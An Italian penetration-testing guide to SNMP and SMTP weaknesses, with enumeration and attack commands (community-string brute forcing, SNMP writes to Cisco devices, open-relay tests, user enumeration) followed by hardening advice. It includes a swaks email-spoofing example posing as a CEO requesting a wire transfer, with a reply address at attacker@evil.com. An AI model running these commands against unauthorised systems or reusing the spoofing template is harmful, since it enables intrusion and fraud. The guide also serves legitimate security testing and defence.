# SNMP & SMTP Vulnerabilities

## Scopo

Questa guida copre le vulnerabilità comuni nei protocolli SNMP (Simple Network Management Protocol) e SMTP (Simple Mail Transfer Protocol), incluse tecniche di enumerazione, exploitation e mitigazioni.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- snmpwalk, snmp-check, onesixtyone
- swaks, smtp-user-enum
- **Autorizzazione scritta** per i test

## Installazione

```bash
sudo apt-get update
sudo apt-get install snmp snmp-mibs-downloader onesixtyone
sudo apt-get install swaks smtp-user-enum
```

---

# SNMP

## Porte e Versioni

| Porta | Protocollo | Uso |
|-------|------------|-----|
| 161 | UDP | Query SNMP |
| 162 | UDP | SNMP Traps |

| Versione | Autenticazione | Note |
|----------|----------------|------|
| v1 | Community string (plaintext) | Insicuro |
| v2c | Community string (plaintext) | Insicuro |
| v3 | Username/Password + Encryption | Sicuro |

---

## Enumerazione SNMP

### Scansione

```bash
# Nmap
nmap -sU -p 161 --script snmp-info target

# Scan range
nmap -sU -p 161 192.168.1.0/24
```

### Brute Force Community String

```bash
# Onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target

# Scan range
onesixtyone -c community.txt -i hosts.txt

# Hydra
hydra -P community.txt target snmp
```

### SNMPWalk

```bash
# Enumerazione completa v2c
snmpwalk -v2c -c public target

# Enumerazione v1
snmpwalk -v1 -c public target

# OID specifico
snmpwalk -v2c -c public target 1.3.6.1.2.1.1

# Output numerico
snmpwalk -v2c -c public -On target
```

### OID Utili

```bash
# System Info
snmpwalk -v2c -c public target 1.3.6.1.2.1.1

# Hostname
snmpwalk -v2c -c public target 1.3.6.1.2.1.1.5

# Utenti Windows
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25

# Processi in esecuzione
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2

# Software installato
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2

# Interfacce di rete
snmpwalk -v2c -c public target 1.3.6.1.2.1.2.2.1.2

# Porte TCP
snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13.1.3

# Routing table
snmpwalk -v2c -c public target 1.3.6.1.2.1.4.21.1.1
```

### SNMP-Check

```bash
# Enumerazione completa
snmp-check target -c public

# Con output dettagliato
snmp-check target -c public -v
```

---

## Exploit SNMP

### Scrittura SNMP (RW Community)

```bash
# Verifica community read-write
snmpwalk -v2c -c private target

# Modifica valore
snmpset -v2c -c private target OID s "new_value"
```

### SNMP RCE (Cisco)

```bash
# Se community RW disponibile su Cisco
# Carica configurazione da TFTP
snmpset -v2c -c private target 1.3.6.1.4.1.9.2.1.55.IP_TFTP s "config.txt"
```

---

## Mitigazioni SNMP

- **Usa SNMPv3**: Autenticazione e crittografia
- **Community string complesse**: Evita "public" e "private"
- **ACL**: Limita accesso SNMP per IP
- **Disabilita se non necessario**
- **Firewall**: Blocca UDP 161/162 dall'esterno

---

# SMTP

## Porte

| Porta | Uso |
|-------|-----|
| 25 | SMTP standard |
| 465 | SMTPS (deprecated) |
| 587 | Submission (con STARTTLS) |

---

## Enumerazione SMTP

### Scansione

```bash
# Nmap
nmap -p 25,465,587 --script smtp-commands target

# Vulnerabilità
nmap -p 25 --script smtp-vuln* target

# Open relay check
nmap -p 25 --script smtp-open-relay target
```

### Banner Grabbing

```bash
# Netcat
nc target 25
EHLO test.com

# Telnet
telnet target 25
EHLO test.com
```

### User Enumeration

```bash
# smtp-user-enum con VRFY
smtp-user-enum -M VRFY -U users.txt -t target

# Con RCPT TO
smtp-user-enum -M RCPT -U users.txt -t target

# Con EXPN
smtp-user-enum -M EXPN -U users.txt -t target
```

### Comandi SMTP

```
VRFY user           # Verifica se utente esiste
EXPN mailinglist    # Espande mailing list
RCPT TO:<user>      # Verifica destinatario
```

---

## Attacchi SMTP

### Open Relay

```bash
# Test manuale
telnet target 25
HELO test.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>
DATA
Subject: Test
Test message
.
QUIT

# Con swaks
swaks --to victim@external.com --from attacker@evil.com --server target
```

### Email Spoofing

```bash
# Con swaks
swaks --to victim@target.com \
      --from ceo@target.com \
      --header "Subject: Urgent" \
      --body "Please wire $50000..." \
      --server target

# Con header personalizzati
swaks --to victim@target.com \
      --from support@bank.com \
      --add-header "Reply-To: attacker@evil.com" \
      --server target
```

### User Enumeration

```bash
# Interattivo
telnet target 25
VRFY admin
252 admin@target.com    # Utente esiste
550 User unknown        # Non esiste

# Script automatico
for user in $(cat users.txt); do
    echo "VRFY $user" | nc -q 1 target 25
done
```

---

## Mitigazioni SMTP

### Disabilita Relay

```
# Postfix
smtpd_relay_restrictions = permit_mynetworks, reject_unauth_destination

# Sendmail
define(`RELAY_DOMAIN_FILE', `/etc/mail/relay-domains')
```

### Disabilita VRFY/EXPN

```
# Postfix
disable_vrfy_command = yes

# Sendmail
PrivacyOptions=novrfy,noexpn
```

### SPF/DKIM/DMARC

```
# Record SPF
v=spf1 ip4:192.168.1.10 -all

# Record DMARC
v=DMARC1; p=reject; rua=mailto:admin@domain.com
```

### Rate Limiting

```
# Postfix
smtpd_client_connection_rate_limit = 10
smtpd_client_message_rate_limit = 100
```

---

## Best Practices

### SNMP

- Usa SNMPv3 con autenticazione forte
- Cambia community string di default
- Limita accesso per IP
- Disabilita se non necessario

### SMTP

- Configura SPF, DKIM, DMARC
- Disabilita open relay
- Disabilita VRFY e EXPN
- Implementa rate limiting
- Usa TLS per connessioni

## Riferimenti

- [SNMP RFCs](https://www.ietf.org/rfc/rfc3411.txt)
- [Postfix Documentation](http://www.postfix.org/documentation.html)
- [SPF Specification](https://www.openspf.org/)
- [DMARC Specification](https://dmarc.org/)
